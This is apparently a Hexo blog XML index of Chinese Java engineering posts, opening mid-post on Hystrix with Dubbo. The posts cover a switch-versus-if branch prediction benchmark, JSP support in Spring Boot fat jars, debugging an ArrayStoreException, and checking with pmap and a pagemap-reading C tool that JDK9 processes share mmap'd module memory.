EnableCircuitBreaker &#123;&#125; EnableCircuitBreakerImportSelector继承了SpringFactoryImportSelector&lt;EnableCircuitBreaker&gt;，使spring加载META-INF/spring.factories里的EnableCircuitBreaker声明的配置 在META-INF/spring.factories里可以找到下面的配置，也就是引入了HystrixCircuitBreakerConfiguration。 12org.springframework.cloud.client.circuitbreaker.EnableCircuitBreaker=\org.springframework.cloud.netflix.hystrix.HystrixCircuitBreakerConfiguration 在HystrixCircuitBreakerConfiguration里可以发现创建了HystrixCommandAspect 1234567@Configurationpublic class HystrixCircuitBreakerConfiguration &#123; @Bean public HystrixCommandAspect hystrixCommandAspect() &#123; return new HystrixCommandAspect(); &#125; 可见spring-cloud-starter-netflix-hystrix实际上也是创建了HystrixCommandAspect来集成Hystrix。 另外spring-cloud-starter-netflix-hystrix里还有metrics, health, dashboard等集成。 总结 对于dubbo provider的@Service是一个spring bean，直接在上面配置@HystrixCommand即可 对于dubbo consumer的@Reference，可以通过加一层简单的spring method包装，配置@HystrixCommand即可 Hystrix本身提供HystrixCommandAspect来集成Spring AOP，配置了@HystrixCommand和@HystrixCollapser的spring method都会被Hystrix处理 链接 https://github.com/Netflix/Hystrix https://github.com/apache/incubator-dubbo http://start.dubbo.io/ https://cloud.spring.io/spring-cloud-netflix/single/spring-cloud-netflix.html#_circuit_breaker_hystrix_clients]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>spring-boot</tag>
        <tag>dubbo</tag>
        <tag>hystrix</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[优化技巧：提前if判断帮助CPU分支预测]]></title>
    <url>%2Foptimization-tip-if-vs-switch%2F</url>
    <content type="text"><![CDATA[分支预测在stackoverflow上有一个非常有名的问题：为什么处理有序数组要比非有序数组快？，可见分支预测对代码运行效率有非常大的影响。 现代CPU都支持分支预测(branch prediction)和指令流水线(instruction pipeline)，这两个结合可以极大提高CPU效率。对于像简单的if跳转，CPU是可以比较好地做分支预测的。但是对于switch跳转，CPU则没有太多的办法。switch本质上是据索引，从地址数组里取地址再跳转。 要提高代码执行效率，一个重要的原则就是尽量避免CPU把流水线清空，那么提高分支预测的成功率就非常重要。 那么对于代码里，如果某个switch分支概率很高，是否可以考虑代码层面帮CPU把判断提前，来提高代码执行效率呢？ Dubbo里ChannelEventRunnable的switch判断在ChannelEventRunnable里有一个switch来判断channel state，然后做对应的逻辑：查看 一个channel建立起来之后，超过99.9%情况它的state都是ChannelState.RECEIVED，那么可以考虑把这个判断提前。 benchmark验证下面通过jmh来验证下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283public class TestBenchMarks &#123; public enum ChannelState &#123; CONNECTED, DISCONNECTED, SENT, RECEIVED, CAUGHT &#125; @State(Scope.Benchmark) public static class ExecutionPlan &#123; @Param(&#123; "1000000" &#125;) public int size; public ChannelState[] states = null; @Setup public void setUp() &#123; ChannelState[] values = ChannelState.values(); states = new ChannelState[size]; Random random = new Random(new Date().getTime()); for (int i = 0; i &lt; size; i++) &#123; int nextInt = random.nextInt(1000000); if (nextInt &gt; 100) &#123; states[i] = ChannelState.RECEIVED; &#125; else &#123; states[i] = values[nextInt % values.length]; &#125; &#125; &#125; &#125; @Fork(value = 5) @Benchmark @BenchmarkMode(Mode.Throughput) public void benchSiwtch(ExecutionPlan plan, Blackhole bh) &#123; int result = 0; for (int i = 0; i &lt; plan.size; ++i) &#123; switch (plan.states[i]) &#123; case CONNECTED: result += ChannelState.CONNECTED.ordinal(); break; case DISCONNECTED: result += ChannelState.DISCONNECTED.ordinal(); break; case SENT: result += ChannelState.SENT.ordinal(); break; case RECEIVED: result += ChannelState.RECEIVED.ordinal(); break; case CAUGHT: result += ChannelState.CAUGHT.ordinal(); break; &#125; &#125; bh.consume(result); &#125; @Fork(value = 5) @Benchmark @BenchmarkMode(Mode.Throughput) public void benchIfAndSwitch(ExecutionPlan plan, Blackhole bh) &#123; int result = 0; for (int i = 0; i &lt; plan.size; ++i) &#123; ChannelState state = plan.states[i]; if (state == ChannelState.RECEIVED) &#123; result += ChannelState.RECEIVED.ordinal(); &#125; else &#123; switch (state) &#123; case CONNECTED: result += ChannelState.CONNECTED.ordinal(); break; case SENT: result += ChannelState.SENT.ordinal(); break; case DISCONNECTED: result += ChannelState.DISCONNECTED.ordinal(); break; case CAUGHT: result += ChannelState.CAUGHT.ordinal(); break; &#125; &#125; &#125; bh.consume(result); &#125;&#125; benchSiwtch里是纯switch判断 benchIfAndSwitch 里用一个if提前判断state是否ChannelState.RECEIVED benchmark结果是： 1234567891011Result &quot;io.github.hengyunabc.jmh.TestBenchMarks.benchSiwtch&quot;: 576.745 ±(99.9%) 6.806 ops/s [Average] (min, avg, max) = (490.348, 576.745, 618.360), stdev = 20.066 CI (99.9%): [569.939, 583.550] (assumes normal distribution)# Run complete. Total time: 00:06:48Benchmark (size) Mode Cnt Score Error UnitsTestBenchMarks.benchIfAndSwitch 1000000 thrpt 100 1535.867 ± 61.212 ops/sTestBenchMarks.benchSiwtch 1000000 thrpt 100 576.745 ± 6.806 ops/s 可以看到提前if判断的确提高了代码效率，这种技巧可以放在性能要求严格的地方。 Benchmark代码：https://github.com/hengyunabc/jmh-demo 总结 switch对于CPU来说难以做分支预测 某些switch条件如果概率比较高，可以考虑单独提前if判断，充分利用CPU的分支预测机制]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpu</tag>
        <tag>dubbo</tag>
        <tag>优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：实现对Fat Jar jsp的支持]]></title>
    <url>%2Fspring-boot-fat-jar-jsp-sample%2F</url>
    <content type="text"><![CDATA[spring boot 对于jsp支持的限制对于jsp的支持，Spring Boot官方只支持了war的打包方式，不支持fat jar。参考官方文档： https://docs.spring.io/spring-boot/docs/current/reference/html/boot-features-developing-web-applications.html#boot-features-jsp-limitations 这里spring boot官方说是tomcat的问题，实际上是spring boot自己改变了打包格式引起的。参考之前的文章：http://hengyunabc.github.io/spring-boot-classloader/#spring-boot-1-3-%E5%92%8C-1-4-%E7%89%88%E6%9C%AC%E7%9A%84%E5%8C%BA%E5%88%AB 原来的结构之下，tomcat是可以扫描到fat jar里的META-INF/resources目录下面的资源的。在增加了BOOT-INF/classes之后，则tomcat扫描不到了。 那么怎么解决这个问题呢？下面给出一种方案，来实现对spring boot fat jar/exploded directory的jsp的支持。 个性化配置tomcat，把BOOT-INF/classes 加入tomcat的ResourceSet在tomcat里，所有扫描到的资源都会放到所谓的ResourceSet里。比如servlet 3规范里的应用jar包的META-INF/resources就是一个ResourceSet。 现在需要想办法把spring boot打出来的fat jar的BOOT-INF/classes目录加到ResourceSet里。 下面通过实现tomcat的 LifecycleListener接口，在Lifecycle.CONFIGURE_START_EVENT事件里，获取到BOOT-INF/classes的URL，再把这个URL加入到WebResourceSet里。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Add main class fat jar/exploded directory into tomcat ResourceSet. * * @author hengyunabc 2017-07-29 * */public class StaticResourceConfigurer implements LifecycleListener &#123; private final Context context; StaticResourceConfigurer(Context context) &#123; this.context = context; &#125; @Override public void lifecycleEvent(LifecycleEvent event) &#123; if (event.getType().equals(Lifecycle.CONFIGURE_START_EVENT)) &#123; URL location = this.getClass().getProtectionDomain().getCodeSource().getLocation(); if (ResourceUtils.isFileURL(location)) &#123; // when run as exploded directory String rootFile = location.getFile(); if (rootFile.endsWith("/BOOT-INF/classes/")) &#123; rootFile = rootFile.substring(0, rootFile.length() - "/BOOT-INF/classes/".length() + 1); &#125; if (!new File(rootFile, "META-INF" + File.separator + "resources").isDirectory()) &#123; return; &#125; try &#123; location = new File(rootFile).toURI().toURL(); &#125; catch (MalformedURLException e) &#123; throw new IllegalStateException("Can not add tomcat resources", e); &#125; &#125; String locationStr = location.toString(); if (locationStr.endsWith("/BOOT-INF/classes!/")) &#123; // when run as fat jar locationStr = locationStr.substring(0, locationStr.length() - "/BOOT-INF/classes!/".length() + 1); try &#123; location = new URL(locationStr); &#125; catch (MalformedURLException e) &#123; throw new IllegalStateException("Can not add tomcat resources", e); &#125; &#125; this.context.getResources().createWebResourceSet(ResourceSetType.RESOURCE_JAR, "/", location, "/META-INF/resources"); &#125; &#125;&#125; 为了让spring boot embedded tomcat加载这个 StaticResourceConfigurer，还需要一个EmbeddedServletContainerCustomizer的配置： 12345678910111213141516171819202122@Configuration@ConditionalOnProperty(name = "tomcat.staticResourceCustomizer.enabled", matchIfMissing = true)public class TomcatConfiguration &#123; @Bean public EmbeddedServletContainerCustomizer staticResourceCustomizer() &#123; return new EmbeddedServletContainerCustomizer() &#123; @Override public void customize(ConfigurableEmbeddedServletContainer container) &#123; if (container instanceof TomcatEmbeddedServletContainerFactory) &#123; ((TomcatEmbeddedServletContainerFactory) container) .addContextCustomizers(new TomcatContextCustomizer() &#123; @Override public void customize(Context context) &#123; context.addLifecycleListener(new StaticResourceConfigurer(context)); &#125; &#125;); &#125; &#125; &#125;; &#125;&#125; 这样子的话，spring boot就可以支持fat jar里的jsp资源了。 demo地址： https://github.com/hengyunabc/spring-boot-fat-jar-jsp-sample 总结 spring boot改变了打包结构，导致tomcat没有办法扫描到fat jar里的/BOOT-INF/classes 通过一个StaticResourceConfigurer把fat jar里的/BOOT-INF/classes加到tomcat的ResourceSet来解决问题]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>tomcat</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入Spring Boot：怎样排查 java.lang.ArrayStoreException]]></title>
    <url>%2Fspring-boot-ArrayStoreException%2F</url>
    <content type="text"><![CDATA[java.lang.ArrayStoreException 分析这个demo来说明怎样排查一个spring boot 1应用升级到spring boot 2时可能出现的java.lang.ArrayStoreException。 demo地址：https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-ArrayStoreException demo里有两个模块，springboot1-starter和springboot2-demo。 在springboot1-starter模块里，是一个简单的HealthIndicator实现 1234567public class MyHealthIndicator extends AbstractHealthIndicator &#123; @Override protected void doHealthCheck(Builder builder) throws Exception &#123; builder.status(Status.UP); builder.withDetail("hello", "world"); &#125;&#125; 123456789101112@Configuration@AutoConfigureBefore(EndpointAutoConfiguration.class)@AutoConfigureAfter(HealthIndicatorAutoConfiguration.class)@ConditionalOnClass(value = &#123; HealthIndicator.class &#125;)public class MyHealthIndicatorAutoConfiguration &#123; @Bean @ConditionalOnMissingBean(MyHealthIndicator.class) @ConditionalOnEnabledHealthIndicator("my") public MyHealthIndicator myHealthIndicator() &#123; return new MyHealthIndicator(); &#125;&#125; springboot2-demo则是一个简单的spring boot2应用，引用了springboot1-starter模块。 把工程导入IDE，执行springboot2-demo里的ArrayStoreExceptionDemoApplication，抛出的异常是 12345678910111213141516171819202122Caused by: java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy at sun.reflect.annotation.AnnotationParser.parseClassArray(AnnotationParser.java:724) ~[na:1.8.0_112] at sun.reflect.annotation.AnnotationParser.parseArray(AnnotationParser.java:531) ~[na:1.8.0_112] at sun.reflect.annotation.AnnotationParser.parseMemberValue(AnnotationParser.java:355) ~[na:1.8.0_112] at sun.reflect.annotation.AnnotationParser.parseAnnotation2(AnnotationParser.java:286) ~[na:1.8.0_112] at sun.reflect.annotation.AnnotationParser.parseAnnotations2(AnnotationParser.java:120) ~[na:1.8.0_112] at sun.reflect.annotation.AnnotationParser.parseAnnotations(AnnotationParser.java:72) ~[na:1.8.0_112] at java.lang.Class.createAnnotationData(Class.java:3521) ~[na:1.8.0_112] at java.lang.Class.annotationData(Class.java:3510) ~[na:1.8.0_112] at java.lang.Class.createAnnotationData(Class.java:3526) ~[na:1.8.0_112] at java.lang.Class.annotationData(Class.java:3510) ~[na:1.8.0_112] at java.lang.Class.getAnnotation(Class.java:3415) ~[na:1.8.0_112] at java.lang.reflect.AnnotatedElement.isAnnotationPresent(AnnotatedElement.java:258) ~[na:1.8.0_112] at java.lang.Class.isAnnotationPresent(Class.java:3425) ~[na:1.8.0_112] at org.springframework.core.annotation.AnnotatedElementUtils.hasAnnotation(AnnotatedElementUtils.java:575) ~[spring-core-5.0.4.RELEASE.jar:5.0.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.isHandler(RequestMappingHandlerMapping.java:177) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE] at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.initHandlerMethods(AbstractHandlerMethodMapping.java:217) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE] at org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.afterPropertiesSet(AbstractHandlerMethodMapping.java:188) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.afterPropertiesSet(RequestMappingHandlerMapping.java:129) ~[spring-webmvc-5.0.4.RELEASE.jar:5.0.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1769) ~[spring-beans-5.0.4.RELEASE.jar:5.0.4.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1706) ~[spring-beans-5.0.4.RELEASE.jar:5.0.4.RELEASE] ... 16 common frames omitted 使用 Java Exception Breakpoint下面来排查这个问题。 在IDE里，新建一个断点，类型是Java Exception Breakpoint（如果不清楚怎么添加，可以搜索对应IDE的使用文档），异常类是上面抛出来的java.lang.ArrayStoreException。 当断点起效时，查看AnnotationUtils.findAnnotation(Class&lt;?&gt;, Class&lt;A&gt;, Set&lt;Annotation&gt;) line: 686 函数的参数。 可以发现 clazz是 class com.example.springboot1starter.MyHealthIndicatorAutoConfiguration$$EnhancerBySpringCGLIB$$945c1f annotationType是 interface org.springframework.boot.actuate.endpoint.annotation.Endpoint 说明是尝试从MyHealthIndicatorAutoConfiguration里查找@Endpoint信息时出错的。 MyHealthIndicatorAutoConfiguration上的确没有@Endpoint，但是为什么抛出java.lang.ArrayStoreException? 尝试以简单例子复现异常首先尝试直接 new MyHealthIndicatorAutoConfiguration ：123public static void main(String[] args) &#123; MyHealthIndicatorAutoConfiguration cc = new MyHealthIndicatorAutoConfiguration();&#125; 本以为会抛出异常来，但是发现执行正常。 再仔细看异常栈，可以发现是在at java.lang.Class.getDeclaredAnnotation(Class.java:3458)抛出的异常，则再尝试下面的代码： 123public static void main(String[] args) &#123; MyHealthIndicatorAutoConfiguration.class.getDeclaredAnnotation(Endpoint.class);&#125; 发现可以复现异常了： 12345678910Exception in thread &quot;main&quot; java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy at sun.reflect.annotation.AnnotationParser.parseClassArray(AnnotationParser.java:724) at sun.reflect.annotation.AnnotationParser.parseArray(AnnotationParser.java:531) at sun.reflect.annotation.AnnotationParser.parseMemberValue(AnnotationParser.java:355) at sun.reflect.annotation.AnnotationParser.parseAnnotation2(AnnotationParser.java:286) at sun.reflect.annotation.AnnotationParser.parseAnnotations2(AnnotationParser.java:120) at sun.reflect.annotation.AnnotationParser.parseAnnotations(AnnotationParser.java:72) at java.lang.Class.createAnnotationData(Class.java:3521) at java.lang.Class.annotationData(Class.java:3510) at java.lang.Class.getDeclaredAnnotation(Class.java:3458) 为什么会是java.lang.ArrayStoreException再仔细看异常信息：java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy ArrayStoreException是一个数组越界的异常，它只有一个String信息，并没有cause。 那么我们尝试在 sun.reflect.annotation.TypeNotPresentExceptionProxy 的构造函数里打断点。 123456789public class TypeNotPresentExceptionProxy extends ExceptionProxy &#123; private static final long serialVersionUID = 5565925172427947573L; String typeName; Throwable cause; public TypeNotPresentExceptionProxy(String typeName, Throwable cause) &#123; this.typeName = typeName; this.cause = cause; &#125; 在断点里，我们可以发现： typeName是 org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration cause是 java.lang.ClassNotFoundException: org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration 终于真相大白了，是找不到org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration这个类。 那么它是怎么变成ArrayStoreException的呢？ 仔细看下代码，可以发现AnnotationParser.parseClassValue把异常包装成为Object 1234567891011121314151617181920//sun.reflect.annotation.AnnotationParser.parseClassValue(ByteBuffer, ConstantPool, Class&lt;?&gt;) private static Object parseClassValue(ByteBuffer buf, ConstantPool constPool, Class&lt;?&gt; container) &#123; int classIndex = buf.getShort() &amp; 0xFFFF; try &#123; try &#123; String sig = constPool.getUTF8At(classIndex); return parseSig(sig, container); &#125; catch (IllegalArgumentException ex) &#123; // support obsolete early jsr175 format class files return constPool.getClassAt(classIndex); &#125; &#125; catch (NoClassDefFoundError e) &#123; return new TypeNotPresentExceptionProxy("[unknown]", e); &#125; catch (TypeNotPresentException e) &#123; return new TypeNotPresentExceptionProxy(e.typeName(), e.getCause()); &#125; &#125; 然后在sun.reflect.annotation.AnnotationParser.parseClassArray(int, ByteBuffer, ConstantPool, Class&lt;?&gt;)里尝试直接设置到数组里 12// sun.reflect.annotation.AnnotationParser.parseClassArray(int, ByteBuffer, ConstantPool, Class&lt;?&gt;)result[i] = parseClassValue(buf, constPool, container); 而这里数组越界了，ArrayStoreException只有越界的Object的类型信息，也就是上面的 1java.lang.ArrayStoreException: sun.reflect.annotation.TypeNotPresentExceptionProxy 解决问题发现是java.lang.ClassNotFoundException: org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration，则加上@ConditionalOnClass的检查就可以了： 12345@Configuration@AutoConfigureBefore(EndpointAutoConfiguration.class)@AutoConfigureAfter(HealthIndicatorAutoConfiguration.class)@ConditionalOnClass(value = &#123;HealthIndicator.class, EndpointAutoConfiguration.class&#125;)public class MyHealthIndicatorAutoConfiguration &#123; 准确来说是spring boot2把一些类的package改了： spring boot 1里类名是： org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration spring boot 2里类名是： org.springframework.boot.actuate.autoconfigure.endpoint.EndpointAutoConfiguration 总结 当类加载时，并不会加载它的annotation的field所引用的Class&lt;?&gt;，当调用Class.getDeclaredAnnotation(Class&lt;A&gt;)里才会加载 以上面的例子来说，就是@AutoConfigureBefore(EndpointAutoConfiguration.class)里的EndpointAutoConfiguration并不会和MyHealthIndicatorAutoConfiguration一起被加载。 jdk内部的解析字节码的代码不合理，把ClassNotFoundException异常吃掉了 排查问题需要一步步深入调试]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
        <tag>ClassLoader</tag>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从java9共享内存加载modules说起]]></title>
    <url>%2Fjava9-mmap-load-modules%2F</url>
    <content type="text"><![CDATA[jdk9后加载lib/modules的方式从jdk的代码里可以看出来，默认的实现加载lib/modules是用mmap来加载的。 12345678910111213class NativeImageBuffer &#123; static &#123; java.security.AccessController.doPrivileged( new java.security.PrivilegedAction&lt;Void&gt;() &#123; public Void run() &#123; System.loadLibrary(&quot;jimage&quot;); return null; &#125; &#125;); &#125; native static ByteBuffer getNativeMap(String imagePath);&#125; 在jimage动态库里最终是一个cpp实现的ImageFileReader来读取的。它在64位os上使用的是mmap方式： https://github.com/dmlloyd/openjdk/blob/jdk/jdk10/src/java.base/share/native/libjimage/imageFile.cpp#L44 通过共享内存启动多个jvm时会有好处： 减少内存占用 加快启动速度 突然有个想法，怎么验证多个jvm的确共享了内存？ 下面来验证一下，思路是： 先获取进程的mmap信息 获取jvm进程映射modules的虚拟地址 从虚拟地址转换为物理地址 启动两个jvm进程，计算它们映射modules是否物理地址是一样的 linux下查看进程的mmap信息 使用pmap -x $pid命令 直接查看 cat /proc/$pid/maps文件的内容 启动一个jshell之后，用pmap查看mmap信息，其中RSS（resident set size）列表示真实占用的内存。： 1234567891011121314151617$ pmap -x 2461524615: jdk9/jdk-9.0.4/bin/jshellAddress Kbytes RSS Dirty Mode Mapping0000000000400000 4 4 0 r-x-- jshell0000000000601000 4 4 4 rw--- jshell000000000111b000 132 120 120 rw--- [ anon ]...00007f764192c000 88 64 0 r-x-- libnet.so00007f7641942000 2048 0 0 ----- libnet.so00007f7641b42000 4 4 4 rw--- libnet.so00007f7641b43000 2496 588 588 rwx-- [ anon ]...00007f7650b43000 185076 9880 0 r--s- modules00007f765c000000 5172 5124 5124 rw--- [ anon ]---------------- ------- ------- -------total kB 2554068 128756 106560 我们可以找到modules文件的信息： 100007f7650b43000 185076 9880 0 r--s- modules 它的文件映射大小是185076kb，实际使用内存大小是9880kb。 linux kernel关于pagemap的说明上面我们获取到了modules的虚拟地址，但是还需要转换为物理地址。 正常来说一个进程是没有办法知道它自己的虚拟地址对应的是什么物理地址。不过我们用linux kernel提供的信息可以读取，转换为物理地址。 linux每个进程都有个/proc/$pid/pagemap文件，里面记录了内存页的信息： https://www.kernel.org/doc/Documentation/vm/pagemap.txt 简而言之，在pagemap里每一个virtual page都有一个对应的64 bit的信息： 123456789* Bits 0-54 page frame number (PFN) if present* Bits 0-4 swap type if swapped* Bits 5-54 swap offset if swapped* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)* Bit 56 page exclusively mapped (since 4.2)* Bits 57-60 zero* Bit 61 page is file-page or shared-anon (since 3.5)* Bit 62 page swapped* Bit 63 page present 只要把虚拟地址转换为pagemap文件里的offset，就可以读取具体的virtual page信息。计算方法是： 1234// getpagesize()是系统调用// 64bit是8字节long virtualPageIndex = virtualAddress / getpagesize()offset = virtualPageIndex * 8 从offset里读取出来的64bit里，可以获取到page frame number，如果想要得到真正的物理地址，还需要再转换： 1234// pageFrameNumber * getpagesize() 获取page的开始地址// virtualAddress % getpagesize() 获取到page里的偏移地址long pageFrameNumber = // read from pagemap filephysicalAddress = pageFrameNumber * getpagesize() + virtualAddress % getpagesize(); 虚拟地址转换物理地址的代码参考这里的代码：https://github.com/cirosantilli/linux-kernel-module-cheat/blob/master/kernel_module/user/common.h 得到的一个从虚拟地址转换为物理地址的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#define _POSIX_C_SOURCE 200809L#include &lt;fcntl.h&gt; /* open */#include &lt;stdint.h&gt; /* uint64_t */#include &lt;stdlib.h&gt; /* size_t */#include &lt;unistd.h&gt; /* pread, sysconf */int BUFSIZ = 1024;typedef struct &#123; uint64_t pfn : 54; unsigned int soft_dirty : 1; unsigned int file_page : 1; unsigned int swapped : 1; unsigned int present : 1;&#125; PagemapEntry;/* Parse the pagemap entry for the given virtual address. * * @param[out] entry the parsed entry * @param[in] pagemap_fd file descriptor to an open /proc/pid/pagemap file * @param[in] vaddr virtual address to get entry for * @return 0 for success, 1 for failure */int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr)&#123; size_t nread; ssize_t ret; uint64_t data; nread = 0; while (nread &lt; sizeof(data)) &#123; ret = pread(pagemap_fd, &amp;data, sizeof(data), (vaddr / sysconf(_SC_PAGE_SIZE)) * sizeof(data) + nread); nread += ret; if (ret &lt;= 0) &#123; return 1; &#125; &#125; entry-&gt;pfn = data &amp; (((uint64_t)1 &lt;&lt; 54) - 1); entry-&gt;soft_dirty = (data &gt;&gt; 54) &amp; 1; entry-&gt;file_page = (data &gt;&gt; 61) &amp; 1; entry-&gt;swapped = (data &gt;&gt; 62) &amp; 1; entry-&gt;present = (data &gt;&gt; 63) &amp; 1; return 0;&#125;/* Convert the given virtual address to physical using /proc/PID/pagemap. * * @param[out] paddr physical address * @param[in] pid process to convert for * @param[in] vaddr virtual address to get entry for * @return 0 for success, 1 for failure */int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr)&#123; char pagemap_file[BUFSIZ]; int pagemap_fd; snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t)pid); pagemap_fd = open(pagemap_file, O_RDONLY); if (pagemap_fd &lt; 0) &#123; return 1; &#125; PagemapEntry entry; if (pagemap_get_entry(&amp;entry, pagemap_fd, vaddr)) &#123; return 1; &#125; close(pagemap_fd); *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE)); return 0;&#125;int main(int argc, char ** argv)&#123; char *end; int pid; uintptr_t virt_addr; uintptr_t paddr; int return_code; pid = strtol(argv[1],&amp;end, 10); virt_addr = strtol(argv[2], NULL, 16); return_code = virt_to_phys_user(&amp;paddr, pid, virt_addr); if(return_code == 0) printf("Vaddr: 0x%lx, paddr: 0x%lx \n", virt_addr, paddr); else printf("error\n");&#125; 另外，收集到一些可以读取pagemap信息的工具： https://github.com/dwks/pagemap 检查两个jvm进程是否映射modules的物理地址一致 先启动两个jshell 123$ jps25105 jdk.internal.jshell.tool.JShellToolProvider25142 jdk.internal.jshell.tool.JShellToolProvider 把上面转换地址的代码保存为mymap.c，再编绎 1gcc mymap.c -o mymap 获取两个jvm的modules的虚拟地址，并转换为物理地址 123456789$ pmap -x 25105 | grep modules00007f82b4b43000 185076 9880 0 r--s- modules$ sudo ./mymap 25105 00007f82b4b43000Vaddr: 0x7f82b4b43000, paddr: 0x33598000$ pmap -x 25142 | grep modules00007ff220504000 185076 10064 0 r--s- modules$ sudo ./mymap 25142 00007ff220504000Vaddr: 0x7ff220504000, paddr: 0x33598000 可以看到两个jvm进程映射modules的物理地址是一样的，证实了最开始的想法。 kernel 里的 page-types 工具其实在kernel里自带有一个工具page-types可以输出一个page信息，可以通过下面的方式来获取内核源码，然后自己编绎： 12sudo apt-get source linux-image-$(uname -r)sudo apt-get build-dep linux-image-$(uname -r) 到tools/vm目录下面，可以直接sudo make编绎。 12345678910111213sudo ./page-types -p 25105 flags page-count MB symbolic-flags long-symbolic-flags0x0000000000000000 2 0 ____________________________________0x0000000000400000 14819 57 ______________________t_____________ thp0x0000000000000800 1 0 ___________M________________________ mmap0x0000000000000828 33 0 ___U_l_____M________________________ uptodate,lru,mmap0x000000000000086c 663 2 __RU_lA____M________________________ referenced,uptodate,lru,active,mmap0x000000000000087c 2 0 __RUDlA____M________________________ referenced,uptodate,dirty,lru,active,mmap0x0000000000005868 10415 40 ___U_lA____Ma_b_____________________ uptodate,lru,active,mmap,anonymous,swapbacked0x0000000000405868 29 0 ___U_lA____Ma_b_______t_____________ uptodate,lru,active,mmap,anonymous,swapbacked,thp0x000000000000586c 5 0 __RU_lA____Ma_b_____________________ referenced,uptodate,lru,active,mmap,anonymous,swapbacked0x0000000000005878 356 1 ___UDlA____Ma_b_____________________ uptodate,dirty,lru,active,mmap,anonymous,swapbacked total 26325 102 jdk8及之前加载jar也是使用mmap的方式在验证了jdk9加载lib/modules之后，随便检查了下jdk8的进程，发现在加载jar包时，也是使用mmap的方式。 一个tomcat进程的map信息如下： 1234567891011$ pmap -x 27226 | grep jar...00007f42c00d4000 16 16 0 r--s- tomcat-dbcp.jar00007f42c09b7000 1892 1892 0 r--s- rt.jar00007f42c45e5000 76 76 0 r--s- catalina.jar00007f42c45f8000 12 12 0 r--s- tomcat-i18n-es.jar00007f42c47da000 4 4 0 r--s- sunec.jar00007f42c47db000 8 8 0 r--s- websocket-api.jar00007f42c47dd000 4 4 0 r--s- tomcat-juli.jar00007f42c47de000 4 4 0 r--s- commons-daemon.jar00007f42c47df000 4 4 0 r--s- bootstrap.jar 可以发现一些有意思的点： 所有jar包的Kbytes 和 RSS(resident set size)是相等的，也就是说整个jar包都被加载到共享内存里了 从URLClassLoader的实现代码来看，它在加载资源时，需要扫描所有的jar包，所以会导致整个jar都要被加载到内存里 对比jdk9里的modules，它的RSS并不是很高，原因是JImage的格式设计合理。所以jdk9后，jvm占用真实内存会降低。 jdk8及之前的 sun.zip.disableMemoryMapping 参数 在jdk6里引入一个 sun.zip.disableMemoryMapping参数，禁止掉利用mmap来加载zip包。http://www.oracle.com/technetwork/java/javase/documentation/overview-156328.html#6u21-rev-b09 https://bugs.openjdk.java.net/browse/JDK-8175192 在jdk9里把这个参数去掉了。因为jdk9之后，jdk本身存在lib/modules 这个文件里了。 总结 linux下可以用pmap来获取进程mmap信息 通过读取/proc/$pid/pagemap可以获取到内存页的信息，并可以把虚拟地址转换为物理地址 jdk9把类都打包到lib/modules，也就是JImage格式，可以减少真实内存占用 jdk9多个jvm可以共用lib/modules映射的内存 默认情况下jdk8及以前是用mmap来加载jar包]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>java9</tag>
        <tag>linux</tag>
        <tag>mmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017读书总结]]></title>
    <url>%2Freading-notes-2017%2F</url>
